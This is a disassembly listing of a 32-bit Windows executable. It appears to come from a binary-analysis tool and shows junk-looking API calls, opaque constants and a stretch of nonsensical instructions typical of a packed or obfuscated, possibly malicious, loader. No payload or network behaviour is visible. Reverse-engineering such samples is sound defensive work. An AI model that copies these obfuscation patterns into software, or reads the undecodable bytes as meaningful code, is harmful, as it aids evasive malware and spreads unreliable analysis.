0x00401000:	pushl	%ebp	; from: 0x00402865(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	subl	$0x70, %esp
0x00401006:	pushl	%ebx
0x00401007:	movl	$0x0, -72(%ebp)
0x0040100e:	movl	$0x0, -112(%ebp)
0x00401015:	movl	$0x0, -24(%ebp)
0x0040101c:	movl	$0x0, -32(%ebp)
0x00401023:	movl	$0x0, -68(%ebp)
0x0040102a:	movl	$0x0, -64(%ebp)
0x00401031:	movl	$0x0, -56(%ebp)
0x00401038:	movl	$0x0, -8(%ebp)
0x0040103f:	movl	$0x0, -28(%ebp)
0x00401046:	movl	$0x0, -60(%ebp)
0x0040104d:	movl	$0x0, -16(%ebp)
0x00401054:	movl	$0x0, -76(%ebp)
0x0040105b:	movl	$0x0, -80(%ebp)
0x00401062:	movl	$0x0, -12(%ebp)
0x00401069:	movl	$0x0, -4(%ebp)
0x00401070:	movl	$0x0, -20(%ebp)
0x00401077:	movl	$0x0, -108(%ebp)
0x0040107e:	movl	$0x0, -104(%ebp)
0x00401085:	movl	0x0045bc54, %eax
0x0040108a:	movl	%eax, -100(%ebp)
0x0040108d:	movl	0x0045bc58, %ecx
0x00401093:	movl	%ecx, -96(%ebp)
0x00401096:	movl	0x0045bc5c, %edx
0x0040109c:	movl	%edx, -92(%ebp)
0x0040109f:	movb	0x0045bc60, %al
0x004010a4:	movb	%al, -88(%ebp)
0x004010a7:	movl	0x0045bc64, %ecx
0x004010ad:	movl	%ecx, -48(%ebp)
0x004010b0:	movl	0x0045bc68, %edx
0x004010b6:	movl	%edx, -44(%ebp)
0x004010b9:	movl	0x0045bc6c, %eax
0x004010be:	movl	%eax, -40(%ebp)
0x004010c1:	movw	0x0045bc70, %cx
0x004010c8:	movw	%cx, -36(%ebp)
0x004010cc:	movb	0x0045bc72, %dl
0x004010d2:	movb	%dl, -34(%ebp)
0x004010d5:	movl	$0x40, -28(%ebp)
0x004010dc:	movl	-80(%ebp), %eax
0x004010df:	pushl	%eax
0x004010e0:	call	ReleaseMutex@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004010e6:	leal	-28(%ebp), %ecx
0x004010e9:	pushl	%ecx
0x004010ea:	leal	-12(%ebp), %edx
0x004010ed:	pushl	%edx
0x004010ee:	pushl	$0x4
0x004010f0:	call	CopySid@advapi32.dll	; targets: 0xff000150(MAY)
0x004010f6:	testl	%eax, %eax
0x004010f8:	je	0x0040113c	; targets: 0x004010fa(MAY), 0x0040113c(MAY)
0x004010fa:	pushl	$0x0	; from: 0x004010f8(MAY)
0x004010fc:	pushl	$0x0
0x004010fe:	pushl	$0x0
0x00401100:	pushl	$0x0
0x00401102:	pushl	$0x320
0x00401107:	pushl	$0x258
0x0040110c:	pushl	$0x0
0x0040110e:	pushl	$0x0
0x00401110:	pushl	$0x50000000
0x00401115:	pushl	$0x0
0x00401117:	pushl	$0x0
0x00401119:	pushl	$0xa
0x0040111b:	call	CreateWindowExA@user32.dll	; targets: unresolved
0x0040113c:	call	GetLastError@kernel32.dll	; targets: 0xff0000e0(MAY)	; from: 0x004010f8(MAY)
0x00401142:	movl	%eax, -32(%ebp)
0x00401145:	movzwl	-32(%ebp), %edx
0x00401149:	cmpl	$0x7a, %edx
0x0040114c:	jne	0x0040117c	; targets: 0x0040117c(MAY), 0x0040114e(MAY)
0x0040114e:	movl	$0xe0d, -20(%ebp)	; from: 0x0040114c(MAY)
0x00401155:	movl	$0x3a, -64(%ebp)
0x0040115c:	movb	$0x0, -36(%ebp)
0x00401160:	movl	$0xbc67b5a2, -8(%ebp)
0x00401167:	movl	-80(%ebp), %eax
0x0040116a:	pushl	%eax
0x0040116b:	pushl	$0x0
0x0040117c:	movb	$0x0, 0x00403090	; from: 0x0040114c(MAY)
0x00401183:	pushl	$0x407d30
0x00401188:	call	GetModuleHandleA@kernel32.dll	; targets: unresolved

start:
0x004012c3:	pushl	%ebp
0x004012c4:	movl	%esp, %ebp
0x004012c6:	subl	$0x54, %esp
0x004012c9:	movl	$0x0, -52(%ebp)
0x004012d0:	movl	$0x0, -4(%ebp)
0x004012d7:	movl	$0x0, -76(%ebp)
0x004012de:	movl	$0x0, -80(%ebp)
0x004012e5:	movl	$0x0, -48(%ebp)
0x004012ec:	pushl	$0x0
0x004012ee:	pushl	$0x0
0x004012f0:	movl	-80(%ebp), %eax
0x004012f3:	pushl	%eax
0x004012f4:	call	0x00402986	; targets: 0x00402986(MAY)
0x004012f9:	leal	-72(%ebp), %ecx
0x004012fc:	pushl	%ecx
0x004012fd:	call	GetSystemTime@kernel32.dll	; targets: 0xff000040(MAY)
0x00401303:	call	GetLastError@kernel32.dll	; targets: 0xff0000e0(MAY)
0x00401309:	movl	%eax, -48(%ebp)
0x0040130c:	pushl	$0x8
0x0040130e:	leal	-44(%ebp), %edx
0x00401311:	pushl	%edx
0x00401312:	call	GetSystemDirectoryA@kernel32.dll	; targets: 0xff000070(MAY)
0x00401318:	movl	-80(%ebp), %eax
0x0040131b:	pushl	%eax
0x0040131c:	pushl	$0x0
0x0040131e:	call	DuplicateIcon@shell32.dll	; targets: 0xff000090(MAY)
0x00401324:	movl	-52(%ebp), %ecx
0x00401327:	pushl	%ecx
0x00401328:	call	0x00401377	; targets: 0x00401377(MAY)
0x00401377:	pushl	%ebp	; from: 0x00401328(MAY)
0x00401378:	movl	%esp, %ebp
0x0040137a:	subl	$0x3c, %esp
0x0040137d:	pushl	%esi
0x0040137e:	movl	$0x0, -36(%ebp)
0x00401385:	movl	$0x0, -48(%ebp)
0x0040138c:	movl	$0x0, -60(%ebp)
0x00401393:	movl	$0x0, -28(%ebp)
0x0040139a:	movl	$0x0, -56(%ebp)
0x004013a1:	movl	$0x0, -40(%ebp)
0x004013a8:	movl	$0x45bc84, -44(%ebp)
0x004013af:	movl	$0x4725dc4f, -36(%ebp)
0x004013b6:	movl	$0x0, -52(%ebp)
0x004013bd:	movl	-36(%ebp), %eax
0x004013c0:	movl	%eax, -32(%ebp)
0x004013c3:	movl	GetLastError@kernel32.dll, %ecx
0x004013c9:	movl	%ecx, -4(%ebp)
0x004013cc:	movl	-60(%ebp), %edx
0x004013cf:	pushl	%edx
0x004013d0:	call	PulseEvent@kernel32.dll	; targets: 0xff0000c0(MAY)
0x004013d6:	movl	-60(%ebp), %eax
0x004013d9:	pushl	%eax
0x004013da:	call	GetTopWindow@user32.dll	; targets: 0xff000160(MAY)
0x004013e0:	pushl	$0x8000
0x004013e5:	pushl	$0x0
0x004013e7:	movl	-60(%ebp), %ecx
0x004013ea:	pushl	%ecx
0x004013eb:	pushl	$0xffffffff
0x004013ed:	call	VirtualFreeEx@kernel32.dll	; targets: 0xff000110(MAY)
0x004013f3:	testl	%eax, %eax
0x004013f5:	je	0x00402859	; targets: 0x004013fb(MAY), 0x00402859(MAY)
0x004013fb:	pushl	$0x0	; from: 0x004013f5(MAY)
0x004013fd:	pushl	$0x0
0x004013ff:	pushl	$0x0
0x00401401:	pushl	$0x0
0x00401403:	pushl	$0x320
0x00401408:	pushl	$0x258
0x0040140d:	pushl	$0x0
0x0040140f:	pushl	$0x0
0x00401411:	pushl	$0x50000000
0x00401416:	pushl	$0x0
0x00401418:	pushl	$0x0
0x0040141a:	pushl	$0xa
0x0040141c:	call	CreateWindowExA@user32.dll	; targets: 0xff0001a0(MAY)
0x00401422:	decl	%ecx
0x00401423:	stosl	%eax, %es:(%edi)
0x00401424:	pushl	%ebp
0x00401425:	sti	
0x00401426:	xchgl	%eax, %edi
0x00401427:	clc	
0x00401428:	movl	$0xe34bdde0, %edi
0x0040142d:	xchgl	%eax, %ecx
0x0040142e:	xchgb	%ah, %cl
0x00401430:	decl	%esi
0x00401431:	movb	$0xffffff9c, %dl
0x00401433:	xorb	%fs:-1880321492(%ebx), %cl
0x0040143a:	adcb	%bl, %dh
0x0040143c:	xchgb	%dl, -955366205(%edi)
0x00401442:	cmc	
0x00401443:	movl	$0xc76f1686, %esp
0x00401448:	testb	$0xffffffab, %al
0x0040144a:	popl	%esp
0x0040144b:	xchgb	%al, -1663927327(%edx)
0x00401451:	lret	$0xffffb1db	; targets: unresolved

0x00402859:	movl	-4(%ebp), %esi	; from: 0x004013f5(MAY)
0x0040285c:	call	%esi	; targets: 0xff0000e0(MAY)
0x0040285e:	movl	%eax, -60(%ebp)
0x00402861:	movl	-32(%ebp), %edx
0x00402864:	pushl	%edx
0x00402865:	call	0x00401000	; targets: 0x00401000(MAY)
0x00402986:	jmp	GetProcessMemoryInfo@psapi.dll	; targets: 0xff0000a0(MAY)	; from: 0x004012f4(MAY)
